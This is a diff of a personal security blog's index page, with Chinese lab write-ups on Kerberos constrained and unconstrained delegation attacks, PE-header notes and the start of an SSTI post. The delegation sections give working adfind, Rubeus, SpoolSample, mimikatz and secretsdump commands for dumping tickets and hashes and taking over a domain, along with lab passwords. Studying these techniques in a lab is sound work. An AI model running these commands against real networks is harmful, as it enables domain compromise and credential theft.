+<p>-impersonate 伪造的用户 存在约束委派的域主机名</p>
+<p>-dc-ip: dc地址</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116221830895.png" alt="image-20220116221830895"></p>
+<p>拿到administrator.ccache</p>
+<p>利用export加载环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p>注: KPB5CCNAME 变量名不可变</p>
+<h6 id="利用secretsdump-py-拖取hash"><a href="#利用secretsdump-py-拖取hash" class="headerlink" title="利用secretsdump.py 拖取hash"></a>利用secretsdump.py 拖取hash</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -k -no-pass win2019.vulntarget.com -dc-ip 10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116224843756.png" alt="image-20220116224843756"></p>
+<p>注: 此处使用的cifs服务进行的攻击，若脚本提示认证失败，最大的可能为我们的利用ST票据与攻击应该使用的ST票据不符。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>摸了……..</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">非约束委派攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-06 23:18:28" itemprop="dateCreated datePublished" datetime="2022-01-06T23:18:28+08:00">2022-01-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-24 20:30:55" itemprop="dateModified" datetime="2022-01-24T20:30:55+08:00">2022-01-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h3><p><strong>委派</strong></p>
+<p>在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106232045335.png" alt="image-20220106232045335"></p>
+<h4 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User访问主机S2上的HTTP服务，此时要想完整的使用HTTP服务，需再访问S3主机上的SQL数据库，但S2并不知道域用户是否拥有权限访问S3上的数据库服务权限，这时为了验证权限，S2会带着User的访问权限去申请访问SQL数据库，若User拥有权限才可进行访问。</span><br></pre></td></tr></table></figure>
+
+<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>非约束委派Kerberos中实现时，User会将自KDC拿到的TGT发送给访问的服务机器Service1,Service1再通过拿到手的TGT票据去申请访问其他域内服务，Service1在拿到用户的TGT票据后，会对其留存，以便下次备用，这时，我们便可在拿下的Service1机器中拿到域用户的TGT票据，从而访问域内的可访问服务(域管用户可访问任意服务)</p>
+<h4 id="非约束委派流程图"><a href="#非约束委派流程图" class="headerlink" title="非约束委派流程图"></a>非约束委派流程图</h4><p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106233107179.png" alt="image-20220106233107179"></p>
+<p><strong>流程</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1.用户发KPB_AS_REQ消息请求[可转发TGT（forwardable TGT）] ,为了方便，先将其称之为TGT1。</span><br><span class="line"></span><br><span class="line">2.KDC在KPB_AS_REQ中返回给User TGT1。</span><br><span class="line"></span><br><span class="line">3.用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称之为TGT2）。</span><br><span class="line"></span><br><span class="line">4.在KRB_TGS_REP消息中返回Forwarded TGT 给User</span><br><span class="line"></span><br><span class="line">5.User使用TGT1向KDC申请访问service1的ST(service Ticket)</span><br><span class="line"></span><br><span class="line">6.KDC返回给用户一个ST</span><br><span class="line"></span><br><span class="line">7.User发送KRB_AP_REQ请求至service1，这个请求包括了TGT1和ST、TGT2、TGT2的sessionKey。</span><br><span class="line"></span><br><span class="line">8.service1使用用户的TGT2使用KRB_TGS_REQ发送给KDC，以用户的名义申请可以访问service2的票据.</span><br><span class="line"></span><br><span class="line">9.KDC在KRB_TGS_REP消息中返回service2到service1的票据.</span><br><span class="line"></span><br><span class="line">10.Service1以用户的名义向Service2发起KRB_AP_REQ请求.</span><br><span class="line"></span><br><span class="line">11.Service2响应步骤10中的Service1请求。</span><br><span class="line"></span><br><span class="line">12.Service1响应步骤7中用户的请求。</span><br><span class="line"></span><br><span class="line">13.在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务。</span><br><span class="line"></span><br><span class="line">14.KDC返回步骤13中请求的票据</span><br><span class="line"></span><br><span class="line">15.和16即为Service1通过模拟用户来访问其他Service。</span><br></pre></td></tr></table></figure>
+
+<p><strong>下面对非约束委派进行复现利用</strong></p>
+<h3 id="非约束委派配置"><a href="#非约束委派配置" class="headerlink" title="非约束委派配置"></a>非约束委派配置</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A MSSQLvc/mssql.vulntarget.com:<span class="number">1433</span> win2016</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108233836061.png" alt="image-20220108233836061"></p>
+<p>当DC配置SPN给域用户Win2016时，在域内将可产生对域用户的委派，我们可以看到，域管理员勾选win2016用户的委派-信任此用户作为任何服务的委派时，将会造成非约束委派的问题。</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234035281.png" alt="image-20220108234035281"></p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109002924052.png" alt="image-20220109002924052"></p>
+<h4 id="非约束委派其特征"><a href="#非约束委派其特征" class="headerlink" title="非约束委派其特征"></a>非约束委派其特征</h4><p>当域用户或机器被设置了非约束委派时，其userAccountControl属性将会包含一个名为”TRUSTED_FOR_DELEGATION”的标志。</p>
+<p>我们可以在ADSI编辑器中找到</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234917330.png" alt="image-20220108234917330"></p>
+<h4 id="探测域内是否存在非约束委派"><a href="#探测域内是否存在非约束委派" class="headerlink" title="探测域内是否存在非约束委派"></a>探测域内是否存在非约束委派</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win2019 10.0.10.110 dc vulntarget\win2019::Admin@666</span><br><span class="line">win2016 10.0.10.111 域内机器 vulntarget\win2016::Admin#123</span><br></pre></td></tr></table></figure>
+
+<p>查找利用账户时，我们暂且不考虑机器账户，因为拿到域内机器账户的票据后，我们无法用于远程访问，因此，我们在进行非约束委派攻击时，首先考虑<strong>域用户</strong>，但这并不意味着<strong>机器账户</strong>没有任何用处，当我们可以对机器账户进行非约束委派攻击时，我们可以根据拿到的<strong>机器账户TGT票据</strong>进行DCsync拿到域内hash等操作。</p>
+<p>利用adfind查找域内启用了非约束委派的机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -h 10.0.10.110 -u vulntarget\win2016 -up Admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235639960.png" alt="image-20220108235639960"></p>
+<p>无需域用户账号密码查询非约束委派的域用户</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe  -b <span class="string">&quot;DC=networksec,DC=loacl&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用adfind查找域内启用了非约束委派的域内用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -h 10.0.10.110 -u vulntarget\win2016 -up Admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235703392.png" alt="image-20220108235703392"></p>
+<p>无需密码查找域内非约束委派的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=DANTE,DC=loacl&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="机器账户的非约束委派攻击"><a href="#机器账户的非约束委派攻击" class="headerlink" title="机器账户的非约束委派攻击"></a>机器账户的非约束委派攻击</h4><p>首先在具备非约束委派攻击条件的域内机器执行Rubeus.exe监控登录操作，并实时转储TGT,（此操作需要本地管理员权限）</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:<span class="number">1</span>  /filteruser:win2019$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109000813844.png" alt="image-20220109000813844"></p>
+<p>利用spoolsample项目使域控强制认证域机器抓取转储tgt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe win2019 win2016</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109003544258.png" alt="image-20220109003544258"></p>
+<p>很遗憾，此处由于dc已是win2019 ，强制认证已经得到微软的修复，因此此处转储机器账户TGT失败。</p>
+<p><code>**低版本域控强制认证成功案例待补充**</code></p>
+<p>但再Win2019 以下如win2012 win2008等服务器内 ，使用spoolSample项目强制域控机认证域机器是有很大概率奏效的。</p>
+<h4 id="域用户的非约束委派攻击"><a href="#域用户的非约束委派攻击" class="headerlink" title="域用户的非约束委派攻击"></a>域用户的非约束委派攻击</h4><p>倘若发现存在非约束委派的用户，这时，我们可以在域内所有可以登陆此用户的域内机器上尝试非约束委派攻击，获取其缓存的服务账号票据，并期望获得域控的票据。</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225405402.png" alt="image-20220109225405402"></p>
+<p>根据前文所用的adfind.exe ，我们可以发现，在win2016机器上，具有我们执行域用户的非约束委派攻击的条件</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225908898.png" alt="image-20220109225908898"></p>
+<p>此处为了演示效果，我们主动让域控对域内机器win2016发起认证</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName win2016</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230059651.png" alt="image-20220109230059651"></p>
+<p>此时，在win2016机器内已经存储下来了域管账户的tgt票据。</p>
+<p>在win2016机器内利用mimikatz转储票据(以管理员权限启动)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230735844.png" alt="image-20220109230735844"></p>
+<p>可以看到转储成功，已拿到域管用户的tgt票据，接下来利用ptt hash传递，获得域管权限。</p>
+<p>PTT之前，我们是无法通过Kerberos认证访问域控机的共享目录的</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230941828.png" alt="image-20220109230941828"></p>
+<p>利用mimikatz进行ptt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;2c7f64]-2-0-60a10000-Administrator@krbtgt-VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231126642.png" alt="image-20220109231126642"></p>
+<p>此时已成功执行！</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231509139.png" alt="image-20220109231509139"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/11/19/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/19/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4/" class="post-title-link" itemprop="url">PE结构-DOS头</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-19 19:40:13 / 修改时间：20:18:04" itemprop="dateCreated datePublished" datetime="2021-11-19T19:40:13+08:00">2021-11-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>PE结构-DOS头，本部分为参照吾爱破解论坛lyl610abc师傅<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1403011-1-1.html">PE文件笔记</a>所整理的学习笔记。</p>
+<h3 id="DOS部首"><a href="#DOS部首" class="headerlink" title="DOS部首"></a>DOS部首</h3><h4 id="DOS部首结构"><a href="#DOS部首结构" class="headerlink" title="DOS部首结构"></a>DOS部首结构</h4><p><strong>其结构分为两部分:</strong></p>
+<ol>
+<li><strong>DOS ‘MZ’ HEADER</strong> 其在c中定义的结构体为_IMAGE_DOS_HEADER</li>
+<li>DOS sub </li>
+</ol>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119195942676.png" alt="image-20211119195942676"></p>
+<h5 id="DOS-MZ头"><a href="#DOS-MZ头" class="headerlink" title="DOS MZ头"></a>DOS MZ头</h5><p>DOS MZ头在C语言中所定义的结构体为:</p>
+<p>定义于<strong>winnt.h</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="分析-IMAGE-DOS-HEADER成员"><a href="#分析-IMAGE-DOS-HEADER成员" class="headerlink" title="分析_IMAGE_DOS_HEADER成员"></a>分析<code>_IMAGE_DOS_HEADER</code>成员</h4><p>DOS部首的存在，是为了往下兼容在低版本DOS系统上运行，所以该部分主要用于DOS系统</p>
+<p>目前在32/64位Windows操作系统中还有效的成员只有两个</p>
+<ul>
+<li>第一个成员:e_magic (WORD 2字节) 用于识别文件是否为PE格式文件 值固定为<strong>4d 5a (MZ)</strong></li>
+<li>最后一个成员: e_lfanew (LONG 4字节)  存储PE头首地址 位于0x3c位置</li>
+</ul>
+<p>DOS部首中的其他值已经在现阶段Windows系统中弃用，下面通过将对应值置换为0，验证其无效性：</p>
+<p>利用16进制编辑器打开Everedit.exe程序，将DOS部首除<strong>e_magic</strong>、<code>e_lfanew</code>之外的DOS部首成员选中清零</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119201606255.png" alt="image-20211119201606255"></p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119201720010.png" alt="image-20211119201720010"></p>
+<p>另存为新文件后仍能正常使用，确认DOS部首其他值已在Windows平台弃用。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/" class="post-title-link" itemprop="url">PE结构-PE文件的两种状态</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-16 14:50:09 / 修改时间：20:50:21" itemprop="dateCreated datePublished" datetime="2021-11-16T14:50:09+08:00">2021-11-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>本文的是学习复现自吾爱破解dalao <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1393291-1-1.html">lyl610abc</a>的PE文件解析系列，非本人原创，属于学习笔记(大佬yyds!)。</p>
 <h3 id="PE文件的两种状态"><a href="#PE文件的两种状态" class="headerlink" title="PE文件的两种状态"></a>PE文件的两种状态</h3><p>PE文件处于磁盘中与处于内存中时，两者的结构会稍微发生改变。</p>
 <p>一个PE文件可以分为两种状态:</p>
 <p>运行态: 当一个PE文件被打开时，PE文件的相关数据将会被<code>装载</code>到内存中，根据文件对齐以及内存对齐中的区别，文件的大小以以及结构会发生相应的改变</p>
@@ -761,65 +1036,68 @@
 
       
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-SSTI模板注入学习" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="article-date">
-      <time datetime="2021-11-12T11:02:54.000Z" itemprop="datePublished">2021-11-12</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">SSTI模板注入学习</a>
-    </h1>
-  
-
-
-      </header>
-      
     
-    <div class="article-entry" itemprop="articleBody">
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
-        <h2 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h2><p>根据yu22x师傅文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163671502616780271551002%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163671502616780271551002&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-110220425.pc_v2_rank_blog_default&utm_term=ssti&spm=1018.2226.3001.4450">SSTI模板注入绕过（进阶篇）</a>复现学习。</p>
+            <a href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">SSTI模板注入学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-12 19:02:54" itemprop="dateCreated datePublished" datetime="2021-11-12T19:02:54+08:00">2021-11-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-13 14:17:19" itemprop="dateModified" datetime="2021-11-13T14:17:19+08:00">2021-11-13</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h2><p>根据yu22x师傅文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163671502616780271551002%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163671502616780271551002&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-110220425.pc_v2_rank_blog_default&utm_term=ssti&spm=1018.2226.3001.4450">SSTI模板注入绕过（进阶篇）</a>复现学习。</p>
 <h3 id="何为SSTI"><a href="#何为SSTI" class="headerlink" title="何为SSTI?"></a>何为SSTI?</h3><p>SSTI,服务器端模板注入</p>
 <ul>
 <li>当服务端接受到攻击者的输入时，将其作为Web应用模板内容的一部分</li>
@@ -1019,65 +1297,62 @@
 
       
     </div>
-    
